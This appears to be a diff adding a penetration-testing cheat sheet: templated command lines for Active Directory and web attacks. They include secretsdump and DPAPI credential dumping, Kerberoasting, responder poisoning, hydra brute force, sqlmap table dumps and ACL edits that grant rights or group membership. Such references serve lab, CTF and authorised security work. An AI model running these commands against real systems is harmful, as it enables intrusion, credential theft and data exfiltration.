@@ -1,0 +1,74 @@
+hashcat --identify $HASH_FILE
+zip2john archive.zip > $HASH_FILE
+gpp-decrypt $BASE64_GPP_PASS
+ffuf -u http://$IP -H "Host:FUZZ.$DOMAIN" -w $SUB_DOMAIN_WORDLIST
+ffuf -u http://$TARGET/FUZZ -w $SUB_DIR_WORDLIST
+gobuster vhost -u http://$DOMAIN -w $SUB_DOMAIN_WORDLIST
+gobuster dir -u http://$DOMAIN -w $SUB_DIR_WORDLIST
+smbclient -L //$IP -N
+smbclient -L //$IP -U "${USER}%${PASSWORD}"
+smbclient //$IP/$SHARE -U "$USER%$PASSWORD"
+smbclient -U "$USER"%"$PASS" //"$DC_IP"/SYSVOL -c "recurse; prompt; cd $DOMAIN/Policies/; mget {*};"
+smbclientng --host $IP -u $USER -p $PASSWORD
+nxc smb $IP -u $USER -p $PASSWORD
+nxc smb $IP -u $USER -H $HASH
+nxc smb $IP -u $USER -p $PASSWORD --users
+nxc smb $IP -u $USER -p $PASSWORD --rid-brute
+nxc ldap $IP -u $USER -p $PASSWORD --kerberoasting $TGS_OUTPUTFILE
+nxc smb $IP -u $USER -p $PASSWORD -M gpp_password
+ftp anonymous@$IP $PORT
+ldapsearch -H ldap://$IP -x -s base -b "" namingContexts
+ldapsearch -H ldap://$IP -x -b "DC=${DOMAIN_NAME},DC=${TLD}"
+ldapdomaindump -u "$DOMAIN\$USER" -p $PASSWORD -o $OUTPUT_DIR/ $IP
+rpcclient -U "${USER}%${PASSWORD}" $IP
+rpcclient -w $DOMAIN -c querydispinfo -U '%' $IP
+rpcclient -w $DOMAIN -c enumdomusers -U '%' $IP
+snmpwalk -c "public" -v1 $IP 1.3.6.1.4.1.77.1.2.25 | awk '{print $4}' | awk -F '"' '{print $2}' > users.txt
+ettercap -Tqr $PCAP_FILE
+nikto -h $URL
+nuclei -u $TARGET
+sqlmap -r $REQUEST_FILE
+sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent
+sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent --cookie="SESSIONID=abc123; other_cookie=value"
+sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent --dbms=$DBMS --tables
+sqlmap -u "$URL" --threads=4 --batch --data="login=whatever&password=whatever" --dbs --random-agent --dbms=$DBMS -D $DATABASE -T $TABLE --dump
+flask-unsign --decode --cookie $COOKIE
+flask-unsign --wordlist $WORDLIST --unsign --cookie $COOKIE --no-literal-eval
+flask-unsign --sign --cookie $JSON_CONTENT --secret $SECRET
+hydra -L $USERNAME_LIST -p whatever $TARGET http-post-form "/$LOGIN_PAGE:username=^USER^&pwd=^PWD^:Invalid username" -t 30 -I  
+hydra -l $VALID_USERNAME -P $PASSWORDS_LIST $TARGET http-post-form "/$LOGIN_PAGE:username=^USER^&pwd=^PWD^:Invalid password" -t 30 -I
+hydra -l $USER -P $PASSWORDS_LIST $TARGET http-post-form "/$LOGIN_PAGE:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\:application/json:incorrect"
+ssh -L $PORT_LOCAL:127.0.0.1:$PORT_DU_SERVICE $USER@$IP
+evil-winrm -i $IP -u $USER -p $PASSWORD
+evil-winrm -i $IP -u $USER -H $NTLM_HASH
+secretsdump.py $USER:$PASSWORD@$IP -outputfile $FILE -user-status -pwd-last-set -history
+secretsdump.py -sam $SAM_FILE -system $SYSTEM_FILE LOCAL
+secretsdump.py -system $SYSTEM_FILE -security $SECURITY_FILE -ntds ntds.dit LOCAL -outputfile $OUTPUT_FILE
+getTGT.py $DOMAIN/$USER:$PASSWORD -dc-ip $IP
+export KRB5CCNAME="$(pwd)/$TICKET_FILE"
+GetUserSPNs.py -dc-ip $IP $DOMAIN/$USER:$PASSWORD
+GetUserSPNs.py -ticket $TICKET_FILE -dc-ip $IP
+GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -outputfile $TGS_OUTPUTFILE -dc-ip $IP
+GetNPUsers.py -dc-ip $IP $DOMAIN/ -request -format hashcat -outputfile $HASH_FILE
+GetNPUsers.py -dc-ip $IP $DOMAIN/$USER:$PASSWORD -request -format hashcat -outputfile $HASH_FILE
+bloodhound-python -c All -u $USER -p $PASSWORD -d $DOMAIN -ns $IP --zip
+responder --interface $INTERFACE
+responder --interface $INTERFACE --lm --disable-ess
+certipy shadow auto -u "$USER"@"$DOMAIN" -hashes $HASH -k -account $TARGET_ACCOUNT -target $DC_NAME"."$DOMAIN
+certipy find -u $USER@$DOMAIN -p $PASSWORD -dc-ip $IP -vulnerable -json
+certipy find -u $USER@$DOMAIN -hashes $HASH -dc-ip $IP -vulnerable -json
+wpscan --url $URL -e u,ap
+net rpc group addmem $TARGET_GROUP $TARGET_USER -U "$DOMAIN/$CONTROLLED_USER%$PASSWORD" -S $IP
+rpcclient -U $DOMAIN"/"$USER"%"$PASSWORD $IP
+rpcclient -U $DOMAIN"/"$USER"%"$HASH --pw-nt-hash $IP
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
+owneredit.py -action write -new-owner $USER -target $TARGET $DOMAIN/$USER:$PASSWORD
+dacledit.py -action 'write' -rights 'FullControl' -principal $USER -target $TARGET $DOMAIN/$USER:$PASSWORD
+gMSADumper.py -u $USER -p $PASSWORD -d $DOMAIN
+targetedKerberoast.py -v -d $DOMAIN -u $USER -p $PASSWORD
+ldapsearch-ad.py -l $IP -t info
+addcomputer.py -hashes $HASH -dc-ip $DC_IP -computer-name $COMPUTER_NAME -computer-pass $COMPUTER_PASS -baseDN $DN $DOMAIN/$USER
+dpapi.py masterkey -file $KEY_FILE -sid $USER_SID -password $USER_PASSWORD
+dpapi.py credential -file $CYPHERED_BLOB -key $KEY
+donpapi collect -t $IP -d $DOMAIN -u $USER -p $PASSWORD
+faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
